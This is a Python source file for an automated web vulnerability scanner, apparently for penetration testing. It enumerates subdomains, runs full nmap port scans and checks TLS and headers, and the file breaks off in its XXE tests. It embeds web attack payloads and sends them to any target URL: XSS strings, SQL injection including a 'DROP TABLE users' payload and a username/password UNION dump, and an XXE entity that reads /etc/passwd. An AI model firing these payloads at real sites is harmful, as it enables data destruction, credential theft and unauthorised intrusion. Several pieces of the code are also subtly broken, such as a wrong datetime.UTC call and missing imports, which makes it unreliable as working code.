import os
import aioredis
import asyncio
import aiohttp
import logging
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, urljoin
import ssl
import socket
from datetime import datetime, timedelta
import xml.etree.ElementTree as ET
import jwt
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, ec
from cryptography.hazmat.primitives import hashes
import nmap
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import re
import json
import base64
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import dns.asyncresolver
import asyncssh
from fastapi import FastAPI, HTTPException
from starlette.middleware.cors import CORSMiddleware
import redis.asyncio as aioredis
import tldextract
from user_agents import parse
from publicsuffixlist import PublicSuffixList
from pyppeteer import launch
from aiosmtpd.controller import Controller
from aioquic.asyncio.client import connect
from aioquic.quic.configuration import QuicConfiguration
from scapy.all import AsyncSniffer
import sqlmap
from bs4 import BeautifulSoup
from http.cookies import SimpleCookie
from urllib.parse import urlparse, parse_qs
import pickle


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AdvancedWebSecurityTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.findings: List[Dict[str, Any]] = []
        self.session: Optional[aiohttp.ClientSession] = None
        self.dns_resolver = dns.asyncresolver.Resolver()
        self.psl = PublicSuffixList()
        self.nmap_scanner = nmap.PortScanner()
        self.redis = aioredis.from_url("redis://localhost", encoding="utf-8", decode_responses=True)
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0',
        ]

    async def initialize(self):
        if self.session is None:
            ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH)
            ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
            ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20')
            conn = aiohttp.TCPConnector(ssl=ssl_context, force_close=True, enable_cleanup_closed=True, limit=100)
            self.session = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=300))

    async def close(self):
        if self.session:
            await self.session.close()
        await self.redis.aclose()

    async def run_all_tests(self):
        await self.initialize()  
        all_findings = []
        tests = [
            self.test_ssl_tls_security(),
            self.test_http_security_headers(),
            self.test_xss_vulnerabilities(),
            self.test_sql_injection(),
            self.test_csrf_vulnerabilities(),
            self.test_clickjacking_vulnerabilities(),
            self.test_xxe_vulnerabilities(),
            self.test_ssrf_vulnerabilities(),
            self.test_open_redirects(),
            self.test_command_injection(),
            self.test_file_inclusion(),
            self.test_insecure_deserialization(),
            self.test_broken_authentication(),
            self.test_sensitive_data_exposure(),    
            self.test_broken_access_control(),
            self.test_security_misconfiguration(),
            self.test_api_security(),
            self.test_docker_security(),
            self.test_kubernetes_security(),
        ]
        
        try:
            results = await asyncio.gather(*tests)
            for result in results:
                all_findings.extend(result)
        finally:
            await self.close()  
        
        return all_findings

    async def perform_reconnaissance(self) -> List[Dict[str, Any]]:
        logger.info("Performing advanced reconnaissance")
        findings = []

        # Subdomain enumeration
        subdomains = await self.enumerate_subdomains()
        findings.extend(self.analyze_subdomains(subdomains))

        # Port scanning
        open_ports = await self.scan_ports()
        findings.extend(self.analyze_open_ports(open_ports))

        # Technology detection
        technologies = await self.detect_technologies()
        findings.extend(self.analyze_technologies(technologies))

        # DNS analysis
        dns_info = await self.analyze_dns()
        findings.extend(self.analyze_dns_results(dns_info))

        return findings

    async def enumerate_subdomains(self) -> List[str]:
        logger.info("Enumerating subdomains")
        subdomains = []
        domain = tldextract.extract(self.target_url).registered_domain

        
        tasks = [
            self.bruteforce_subdomains(domain),
            self.search_crtsh(domain),
            self.search_dnsdumpster(domain),
            self.search_virustotal(domain),
        ]

        results = await asyncio.gather(*tasks)
        for result in results:
            subdomains.extend(result)

        return list(set(subdomains)) 

    async def bruteforce_subdomains(self, domain: str) -> List[str]:
        subdomains = []
        wordlist = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3', 'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static', 'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki', 'web', 'media', 'email', 'images', 'img', 'www1', 'intranet', 'portal', 'video', 'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1', 'ns4', 'www3', 'dns', 'search', 'staging', 'server', 'mx1', 'chat', 'wap', 'my', 'svn', 'mail1', 'sites', 'proxy', 'ads', 'host', 'crm', 'cms', 'backup', 'mx2', 'lyncdiscover', 'info', 'apps', 'download', 'remote', 'db', 'forums', 'store', 'relay', 'files', 'newsletter', 'app', 'live', 'owa', 'en', 'start', 'sms', 'office', 'exchange', 'ipv4', 'mail3', 'help', 'blogs', 'helpdesk', 'web1', 'home', 'library', 'ftp2', 'ntp', 'monitor', 'login', 'service', 'correo', 'www4', 'moodle', 'it', 'gateway', 'gw', 'i', 'stat', 'stage', 'ldap', 'tv', 'ssl', 'web2', 'ns5', 'upload', 'nagios', 'smtp2', 'online', 'ad', 'survey', 'data', 'radio', 'extranet', 'test2', 'mssql', 'dns3', 'jobs', 'services', 'panel', 'irc', 'hosting', 'cloud', 'de', 'gmail', 's', 'bbs', 'cs', 'ww', 'mrtg', 'git', 'image', 'members', 'poczta', 's1', 'meet', 'preview', 'fr', 'cloudflare-resolve-to', 'dev2', 'photo', 'jabber', 'legacy', 'go', 'es', 'ssh', 'redmine', 'partner', 'vps', 'server1', 'sv', 'ns6', 'webmail2', 'av', 'community', 'cacti', 'time', 'sftp', 'lib', 'facebook', 'www5', 'smtp1', 'feeds', 'w', 'games', 'ts', 'alumni', 'dl', 's2', 'phpmyadmin', 'archive', 'cn', 'tools', 'stream', 'projects', 'elearning', 'im', 'iphone', 'control', 'voip', 'test1', 'ws', 'rss', 'sp', 'wwww', 'vpn2', 'jira', 'list', 'connect', 'gallery', 'billing', 'mailer', 'update', 'pda', 'game', 'ns0', 'testing', 'sandbox', 'job', 'events', 'dialin', 'ml', 'fb', 'videos', 'music', 'a', 'partners', 'mailhost', 'downloads', 'reports', 'ca', 'router', 'speedtest', 'local', 'training', 'edu', 'bugs', 'manage', 's3', 'status', 'host2', 'ww2', 'marketing', 'conference', 'content', 'network-ip', 'broadcast-ip', 'english', 'catalog', 'msoid', 'mailadmin', 'pay', 'access', 'streaming', 'project', 't', 'sso', 'alpha', 'photos', 'staff', 'e', 'auth', 'v2', 'web5', 'web3', 'mail4', 'devel', 'post', 'us', 'images2', 'master', 'rt', 'ftp1', 'qa', 'wp', 'dns4', 'www6', 'ru', 'student', 'w3', 'citrix', 'trac', 'doc', 'img2', 'css', 'mx3', 'adm', 'web4', 'hr', 'mailserver', 'travel', 'sharepoint', 'sport', 'member', 'bb', 'agenda', 'link', 'server2', 'vod', 'uk', 'fw', 'promo', 'vip', 'noc', 'design', 'temp', 'gate', 'ns7', 'file', 'ms', 'map', 'cache', 'painel', 'js', 'event', 'mailing', 'db1', 'c', 'auto', 'img1', 'vpn1', 'business', 'mirror', 'share', 'cdn2', 'site', 'maps', 'tickets', 'tracker', 'domains', 'club', 'images1', 'zimbra', 'cvs', 'b2b', 'oa', 'intra', 'zabbix', 'ns8', 'assets', 'main', 'spam', 'lms', 'social', 'faq', 'feedback', 'loopback', 'groups', 'm2', 'cas', 'loghost', 'xml', 'nl', 'research', 'art', 'munin', 'dev1', 'gis', 'sales', 'images3', 'report', 'google', 'idp', 'cisco', 'careers', 'seo', 'dc', 'lab', 'd', 'firewall', 'fs', 'eng', 'ann', 'mail01', 'mantis', 'v', 'affiliates', 'webconf', 'track', 'ticket', 'pm', 'db2', 'b', 'clients', 'tech', 'erp', 'monitoring', 'cdn1', 'images4', 'payment', 'origin', 'client', 'foto', 'domain', 'pt', 'pma', 'directory', 'cc', 'public', 'finance', 'ns11', 'test3', 'wordpress', 'corp', 'sslvpn', 'cal', 'mailman', 'book', 'ip', 'zeus', 'ns10', 'hermes', 'storage', 'free', 'static1', 'pbx', 'banner', 'mobil', 'kb', 'mail5', 'direct', 'ipfixe', 'wifi', 'development', 'board', 'ns01', 'st', 'reviews', 'radius', 'pro', 'atlas', 'links', 'in', 'oldmail', 'register', 's4', 'images6', 'static2', 'id', 'shopping', 'drupal', 'analytics', 'm1', 'images5', 'images7', 'img3', 'mx01', 'www7', 'redirect', 'sitebuilder', 'smtp3', 'adserver', 'net', 'user', 'forms', 'outlook', 'press', 'vc', 'health', 'work', 'mb', 'mm', 'f', 'pgsql', 'jp', 'sports', 'preprod', 'g', 'p', 'mdm', 'ar', 'lync', 'market', 'dbadmin', 'barracuda', 'affiliate', 'mars', 'users','love', 'rs', 'sc', 'sol', 'uni', 'job', 'demo2', 'photogallery', 'cisco-lwapp-controller', 'xmpp', 'mexico', 'journal', 'sa', 'uat', 'greek', 'tr', 'config', 'dialin', 'portfolio', 'ask', 'ww1', 'cert', 'pub', 'ent', 'ws1', 'ebook', 'ftp3']

        for subdomain in wordlist:
            full_domain = f"{subdomain}.{domain}"
            try:
                await self.dns_resolver.query(full_domain, 'A')
                subdomains.append(full_domain)
            except dns.resolver.NXDOMAIN:
                pass

        return subdomains

    async def search_crtsh(self, domain: str) -> List[str]:
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        async with self.session.get(url) as response:
            if response.status == 200:
                data = await response.json()
                return list(set([item['name_value'] for item in data if item['name_value'].endswith(domain)]))
            return []

    async def search_dnsdumpster(self, domain: str) -> List[str]:
        url = f"https://dnsdumpster.com/"
        async with self.session.get(url) as response:
            if response.status == 200:
                csrf_token = re.search(r"name='csrfmiddlewaretoken' value='(.*?)'", await response.text()).group(1)
        
        data = {
            'csrfmiddlewaretoken': csrf_token,
            'targetip': domain,
        }
        headers = {
            'Referer': url,
        }
        async with self.session.post(url, data=data, headers=headers) as response:
            if response.status == 200:
                content = await response.text()
                return re.findall(r'[a-zA-Z0-9\.-]+\.' + domain, content)
            return []

    async def search_virustotal(self, domain: str) -> List[str]:
        # Nota: Anda perlu API key VirusTotal untuk menggunakan ini
        api_key = "Get_Api_Key"
        url = f"https://www.virustotal.com/vtapi/v2/domain/report"
        params = {'apikey': api_key, 'domain': domain}
        async with self.session.get(url, params=params) as response:
            if response.status == 200:
                data = await response.json()
                return data.get('subdomains', [])
            return []

    async def scan_ports(self) -> Dict[str, List[int]]:
        logger.info("Scanning ports")
        open_ports = {}
        target = urlparse(self.target_url).netloc
        
        try:
            # Menggunakan nmap untuk pemindaian port
            self.nmap_scanner.scan(target, arguments="-p- -sV --open")
            for host in self.nmap_scanner.all_hosts():
                open_ports[host] = []
                for proto in self.nmap_scanner[host].all_protocols():
                    ports = self.nmap_scanner[host][proto].keys()
                    for port in ports:
                        open_ports[host].append(port)
        except Exception as e:
            logger.error(f"Error during port scanning: {str(e)}")
        
        return open_ports

    def analyze_open_ports(self, open_ports: Dict[str, List[int]]) -> List[Dict[str, Any]]:
        findings = []
        for host, ports in open_ports.items():
            for port in ports:
                service = self.nmap_scanner[host]['tcp'][port]['name']
                finding = {
                    'severity': 'Info',
                    'category': 'Port Scan',
                    'description': f"Open port {port} ({service}) found on {host}",
                    'impact': 'Potential attack surface',
                    'recommendation': f"Verify if port {port} needs to be open and properly secure it if necessary"
                }
                if port in [80, 443, 8080, 8443]:
                    finding['severity'] = 'Low'
                elif port in [22, 3389]:
                    finding['severity'] = 'Medium'
                    finding['description'] += " (Remote access service)"
                elif port in [1433, 3306, 5432]:
                    finding['severity'] = 'High'
                    finding['description'] += " (Database service)"
                findings.append(finding)
        return findings

    async def detect_technologies(self) -> Dict[str, Any]:
        logger.info("Detecting technologies")
        technologies = {}
        
        async with self.session.get(self.target_url) as response:
            if response.status == 200:
                html = await response.text()
                headers = response.headers
                
                # Deteksi server
                server = headers.get('Server')
                if server:
                    technologies['Server'] = server

                # Deteksi CMS
                if 'WordPress' in html:
                    technologies['CMS'] = 'WordPress'
                elif 'Drupal' in html:
                    technologies['CMS'] = 'Drupal'
                elif 'Joomla' in html:
                    technologies['CMS'] = 'Joomla'

                # Deteksi JavaScript frameworks
                if 'react' in html.lower():
                    technologies['JS Framework'] = 'React'
                elif 'vue' in html.lower():
                    technologies['JS Framework'] = 'Vue.js'
                elif 'angular' in html.lower():
                    technologies['JS Framework'] = 'Angular'

                # Deteksi Web Server
                if 'nginx' in server.lower():
                    technologies['Web Server'] = 'Nginx'
                elif 'apache' in server.lower():
                    technologies['Web Server'] = 'Apache'
                elif 'iis' in server.lower():
                    technologies['Web Server'] = 'IIS'

        return technologies

    def analyze_technologies(self, technologies: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings = []
        for tech_type, tech in technologies.items():
            finding = {
                'severity': 'Info',
                'category': 'Technology Detection',
                'description': f"{tech_type} detected: {tech}",
                'impact': 'Potential vulnerabilities associated with this technology',
                'recommendation': f"Keep {tech} updated and properly configured"
            }
            if tech_type == 'Server' and tech in ['Apache', 'Nginx', 'IIS']:
                finding['severity'] = 'Low'
                finding['description'] += " (Version information exposed)"
            elif tech_type == 'CMS':
                finding['severity'] = 'Medium'
                finding['description'] += " (Ensure it's the latest version)"
            findings.append(finding)
        return findings

    async def analyze_dns(self) -> Dict[str, Any]:
        logger.info("Analyzing DNS")
        dns_info = {}
        domain = urlparse(self.target_url).netloc

        # A record
        try:
            a_result = await self.dns_resolver.query(domain, 'A')
            dns_info['A'] = [ip.host for ip in a_result]
        except aiodns.error.DNSError:
            dns_info['A'] = []

        # MX record
        try:
            mx_result = await self.dns_resolver.query(domain, 'MX')
            dns_info['MX'] = [mx.host for mx in mx_result]
        except aiodns.error.DNSError:
            dns_info['MX'] = []

        # NS record
        try:
            ns_result = await self.dns_resolver.query(domain, 'NS')
            dns_info['NS'] = [ns.host for ns in ns_result]
        except aiodns.error.DNSError:
            dns_info['NS'] = []

        # TXT record
        try:
            txt_result = await self.dns_resolver.query(domain, 'TXT')
            dns_info['TXT'] = [txt.text for txt in txt_result]
        except aiodns.error.DNSError:
            dns_info['TXT'] = []

        return dns_info

    def analyze_dns_results(self, dns_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings = []
        
        # Analisis A record
        if not dns_info['A']:
            findings.append({
                'severity': 'Medium',
                'category': 'DNS Configuration',
                'description': 'No A record found',
                'impact': 'The domain might not resolve to any IP address',
                'recommendation': 'Configure an A record for the domain'
            })
        
        # Analisis MX record
        if not dns_info['MX']:
            findings.append({
                'severity': 'Low',
                'category': 'DNS Configuration',
                'description': 'No MX record found',
                'impact': 'Email delivery might be affected',
                'recommendation': 'Configure MX records if email services are required'
            })
        
        # Analisis NS record
        if len(dns_info['NS']) < 2:
            findings.append({
                'severity': 'Medium',
                'category': 'DNS Configuration',
                'description': 'Less than two NS records found',
                'impact': 'Reduced DNS redundancy and potential single point of failure',
                'recommendation': 'Configure at least two NS records for redundancy'
            })
        
        # Analisis TXT record untuk SPF
        spf_record = next((txt for txt in dns_info['TXT'] if txt.startswith('v=spf1')), None)
        if not spf_record:
            findings.append({
                'severity': 'Medium',
                'category': 'Email Security',
                'description': 'No SPF record found',
                'impact': 'Increased risk of email spoofing',
                'recommendation': 'Implement an SPF record to prevent email spoofing'
            })
        
        # Analisis TXT record untuk DMARC
        dmarc_record = next((txt for txt in dns_info['TXT'] if txt.startswith('v=DMARC1')), None)
        if not dmarc_record:
            findings.append({
                'severity': 'Medium',
                'category': 'Email Security',
                'description': 'No DMARC record found',
                'impact': 'Reduced protection against email spoofing and phishing',
                'recommendation': 'Implement a DMARC record to enhance email security'
            })
        
        return findings

    async def test_ssl_tls_security(self) -> List[Dict[str, Any]]:
        logger.info("Testing SSL/TLS security")
        findings = []
        
        parsed_url = urlparse(self.target_url)
        hostname = parsed_url.hostname
        port = parsed_url.port or 443

        try:
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE

            async with self.session.get(self.target_url, ssl=ssl_context) as response:
                ssl_info = response.connection.transport.get_extra_info('ssl_object')
                
                # Analisis versi protokol
                protocol_version = ssl_info.version()
                if protocol_version in ['TLSv1', 'TLSv1.1']:
                    findings.append({
                        'severity': 'High',
                        'category': 'SSL/TLS',
                        'description': f'Outdated TLS version in use: {protocol_version}',
                        'impact': 'Vulnerable to known attacks, may not be supported by modern browsers',
                        'recommendation': 'Upgrade to TLS 1.2 or preferably TLS 1.3'
                    })

                # Analisis cipher suite
                cipher = ssl_info.cipher()
                if cipher:
                    cipher_name, tls_version, bits = cipher
                    if 'NULL' in cipher_name or 'EXPORT' in cipher_name or 'RC4' in cipher_name or 'MD5' in cipher_name:
                        findings.append({
                            'severity': 'Critical',
                            'category': 'SSL/TLS',
                            'description': f'Weak cipher suite in use: {cipher_name}',
                            'impact': 'Highly vulnerable to cryptographic attacks',
                            'recommendation': 'Disable weak cipher suites and use only strong, modern ciphers'
                        })

                # Analisis sertifikat
                cert = ssl_info.getpeercert(binary_form=True)
                x509_cert = x509.load_der_x509_certificate(cert, default_backend())
                
                # Periksa tanggal kadaluwarsa
                if x509_cert.not_valid_after < datetime.now(datetime.UTC):
                    findings.append({
                        'severity': 'Critical',
                        'category': 'SSL/TLS',
                        'description': 'SSL certificate has expired',
                        'impact': 'Users will see security warnings, high risk of MITM attacks',
                        'recommendation': 'Renew the SSL certificate immediately'
                    })
                elif x509_cert.not_valid_after < datetime.now(datetime.UTC) + timedelta(days=30):
                    findings.append({
                        'severity': 'High',
                        'category': 'SSL/TLS',
                        'description': f'SSL certificate will expire soon (on {x509_cert.not_valid_after})',
                        'impact': 'Potential service disruption if not renewed',
                        'recommendation': 'Plan to renew the SSL certificate before expiration'
                    })

                # Periksa kekuatan kunci
                public_key = x509_cert.public_key()
                if isinstance(public_key, rsa.RSAPublicKey):
                    key_size = public_key.key_size
                    if key_size < 2048:
                        findings.append({
                            'severity': 'High',
                            'category': 'SSL/TLS',
                            'description': f'Weak RSA key size ({key_size} bits)',
                            'impact': 'Increased vulnerability to cryptographic attacks',
                            'recommendation': 'Use an RSA key size of at least 2048 bits, preferably 4096 bits'
                        })

        except Exception as e:
            logger.error(f"Error during SSL/TLS analysis: {str(e)}")
            findings.append({
                'severity': 'Error',
                'category': 'SSL/TLS',
                'description': f'Error during SSL/TLS analysis: {str(e)}',
                'impact': 'Unable to assess SSL/TLS security',
                'recommendation': 'Manually verify SSL/TLS configuration'
            })

        return findings

    async def test_http_security_headers(self) -> List[Dict[str, Any]]:
        logger.info("Testing HTTP security headers")
        findings = []
        if self.session is None:
            logger.error("Session not initialized")
            return findings
        try:
            async with self.session.get(self.target_url) as response:
                headers = response.headers

            # Content-Security-Policy
            if 'Content-Security-Policy' not in headers:
                findings.append({
                    'severity': 'High',
                    'category': 'HTTP Headers',
                    'description': 'Content-Security-Policy header is missing',
                    'impact': 'Increased risk of XSS and other injection attacks',
                    'recommendation': 'Implement a strong Content Security Policy'
                })
            else:
                csp = headers['Content-Security-Policy']
                if "default-src 'none'" not in csp and "default-src 'self'" not in csp:
                    findings.append({
                        'severity': 'Medium',
                        'category': 'HTTP Headers',
                        'description': 'Content-Security-Policy header is not strict enough',
                        'impact': 'Potential for XSS and other injection attacks',
                        'recommendation': 'Implement a stricter Content Security Policy'
                    })

            # X-Frame-Options
            if 'X-Frame-Options' not in headers:
                findings.append({
                    'severity': 'Medium',
                    'category': 'HTTP Headers',
                    'description': 'X-Frame-Options header is missing',
                    'impact': 'Increased risk of clickjacking attacks',
                    'recommendation': 'Implement X-Frame-Options header with DENY or SAMEORIGIN value'
                })

            # X-XSS-Protection
            if 'X-XSS-Protection' not in headers:
                findings.append({
                    'severity': 'Low',
                    'category': 'HTTP Headers',
                    'description': 'X-XSS-Protection header is missing',
                    'impact': 'Reduced protection against XSS attacks in older browsers',
                    'recommendation': 'Implement X-XSS-Protection header with "1; mode=block" value'
                })

            # Strict-Transport-Security
            if 'Strict-Transport-Security' not in headers:
                findings.append({
                    'severity': 'Medium',
                    'category': 'HTTP Headers',
                    'description': 'Strict-Transport-Security header is missing',
                    'impact': 'Increased risk of man-in-the-middle attacks',
                    'recommendation': 'Implement Strict-Transport-Security header with a long max-age'
                })

            # X-Content-Type-Options
            if 'X-Content-Type-Options' not in headers:
                findings.append({
                    'severity': 'Low',
                    'category': 'HTTP Headers',
                    'description': 'X-Content-Type-Options header is missing',
                    'impact': 'Increased risk of MIME type confusion attacks',
                    'recommendation': 'Implement X-Content-Type-Options header with "nosniff" value'
                })

            # Referrer-Policy
            if 'Referrer-Policy' not in headers:
                findings.append({
                    'severity': 'Low',
                    'category': 'HTTP Headers',
                    'description': 'Referrer-Policy header is missing',
                    'impact': 'Potential leakage of referrer information',
                    'recommendation': 'Implement Referrer-Policy header with appropriate value'
                })

        except Exception as e:
            logger.error(f"Error testing HTTP security headers: {str(e)}")

        return findings

    async def test_xss_vulnerabilities(self) -> List[Dict[str, Any]]:
        logger.info("Testing for XSS vulnerabilities")
        findings = []

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        ]

        # Test GET parameters
        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        for param, value in params.items():
            for payload in xss_payloads:
                test_url = self.target_url.replace(f"{param}={value[0]}", f"{param}={payload}")
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    if payload in content:
                        findings.append({
                            'severity': 'High',
                            'category': 'XSS',
                            'description': f'Potential XSS vulnerability found in GET parameter: {param}',
                            'impact': 'Attackers could inject malicious scripts',
                            'recommendation': 'Implement proper input validation and output encoding'
                        })
                        break  # Move to next parameter if vulnerability found

        # Test POST parameters
        form_urls = await self.find_forms()
        for form_url in form_urls:
            async with self.session.get(form_url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                forms = soup.find_all('form')
                for form in forms:
                    action = urljoin(form_url, form.get('action', ''))
                    method = form.get('method', 'get').lower()
                    if method != 'post':
                        continue
                    inputs = form.find_all('input')
                    data = {input.get('name'): input.get('value', '') for input in inputs if input.get('name')}
                    for input_name in data.keys():
                        for payload in xss_payloads:
                            test_data = data.copy()
                            test_data[input_name] = payload
                            async with self.session.post(action, data=test_data) as response:
                                content = await response.text()
                                if payload in content:
                                    findings.append({
                                        'severity': 'High',
                                        'category': 'XSS',
                                        'description': f'Potential XSS vulnerability found in POST parameter: {input_name}',
                                        'impact': 'Attackers could inject malicious scripts',
                                        'recommendation': 'Implement proper input validation and output encoding'
                                    })
                                    break  # Move to next input if vulnerability found

        return findings

    async def test_sql_injection(self) -> List[Dict[str, Any]]:
        logger.info("Testing for SQL injection vulnerabilities")
        findings = []

        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' UNION SELECT username, password, NULL FROM users --",
            "1; DROP TABLE users --",
            "1' AND SLEEP(5) --",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d373e496e6a65637465642062792044726f70205461626c65203c2f666f6e743e3c2f63656e7465723e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"
        ]

        # Test GET parameters
        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        for param, value in params.items():
            for payload in sql_payloads:
                test_url = self.target_url.replace(f"{param}={value[0]}", f"{param}={payload}")
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    if self._check_sql_injection_response(content):
                        findings.append({
                            'severity': 'Critical',
                            'category': 'SQL Injection',
                            'description': f'Potential SQL injection vulnerability found in GET parameter: {param}',
                            'impact': 'Attackers could manipulate or retrieve sensitive database information',
                            'recommendation': 'Use parameterized queries or ORM to prevent SQL injection'
                        })
                        break  

        # Test POST parameters
        form_urls = await self.find_forms()
        for form_url in form_urls:
            async with self.session.get(form_url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                forms = soup.find_all('form')
                for form in forms:
                    action = urljoin(form_url, form.get('action', ''))
                    method = form.get('method', 'get').lower()
                    if method != 'post':
                        continue
                    inputs = form.find_all('input')
                    data = {input.get('name'): input.get('value', '') for input in inputs if input.get('name')}
                    for input_name in data.keys():
                        for payload in sql_payloads:
                            test_data = data.copy()
                            test_data[input_name] = payload
                            async with self.session.post(action, data=test_data) as response:
                                content = await response.text()
                                if self._check_sql_injection_response(content):
                                    findings.append({
                                        'severity': 'Critical',
                                        'category': 'SQL Injection',
                                        'description': f'Potential SQL injection vulnerability found in POST parameter: {input_name}',
                                        'impact': 'Attackers could manipulate or retrieve sensitive database information',
                                        'recommendation': 'Use parameterized queries or ORM to prevent SQL injection'
                                    })
                                    break  

        return findings

    def _check_sql_injection_response(self, content: str) -> bool:
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Microsoft OLE DB Provider for ODBC Drivers error",
            r"Microsoft OLE DB Provider for SQL Server error",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*",
        ]
        return any(re.search(pattern, content, re.IGNORECASE) for pattern in error_patterns)

    async def find_forms(self) -> List[str]:
        logger.info("Finding forms on the website")
        form_urls = []
        async with self.session.get(self.target_url) as response:
            content = await response.text()
            soup = BeautifulSoup(content, 'html.parser')
            links = soup.find_all('a', href=True)
            for link in links:
                url = urljoin(self.target_url, link['href'])
                if url.startswith(self.target_url):
                    async with self.session.get(url) as page_response:
                        page_content = await page_response.text()
                        page_soup = BeautifulSoup(page_content, 'html.parser')
                        if page_soup.find('form'):
                            form_urls.append(url)
        return list(set(form_urls))  

    async def test_csrf_vulnerabilities(self) -> List[Dict[str, Any]]:
        logger.info("Testing for CSRF vulnerabilities")
        findings = []

        form_urls = await self.find_forms()
        for form_url in form_urls:
            async with self.session.get(form_url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                forms = soup.find_all('form')
                for form in forms:
                    if form.get('method', '').lower() == 'post':
                        csrf_token = form.find('input', attrs={'name': re.compile(r'csrf|token', re.I)})
                        if not csrf_token:
                            findings.append({
                                'severity': 'High',
                                'category': 'CSRF',
                                'description': f'Potential CSRF vulnerability found in form at {form_url}',
                                'impact': 'Attackers could perform unauthorized actions on behalf of authenticated users',
                                'recommendation': 'Implement CSRF tokens for all state-changing operations'
                            })

        return findings

    async def test_clickjacking_vulnerabilities(self) -> List[Dict[str, Any]]:
        logger.info("Testing for Clickjacking vulnerabilities")
        findings = []

        async with self.session.get(self.target_url) as response:
            headers = response.headers
            if 'X-Frame-Options' not in headers and 'Content-Security-Policy' not in headers:
                findings.append({
                    'severity': 'Medium',
                    'category': 'Clickjacking',
                    'description': 'No protection against Clickjacking attacks',
                    'impact': 'The website could be embedded in an iframe, potentially leading to clickjacking attacks',
                    'recommendation': 'Implement X-Frame-Options or Content-Security-Policy with frame-ancestors directive'
                })
            elif 'X-Frame-Options' in headers:
                if headers['X-Frame-Options'].upper() not in ['DENY', 'SAMEORIGIN']:
                    findings.append({
                        'severity': 'Low',
                        'category': 'Clickjacking',
                        'description': f'Potentially weak X-Frame-Options: {headers["X-Frame-Options"]}',
                        'impact': 'The current X-Frame-Options setting might not provide adequate protection against clickjacking',
                        'recommendation': 'Set X-Frame-Options to DENY or SAMEORIGIN'
                    })

        return findings

    async def test_xxe_vulnerabilities(self) -> List[Dict[str, Any]]:
        logger.info("Testing for XXE vulnerabilities")
        findings = []

        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
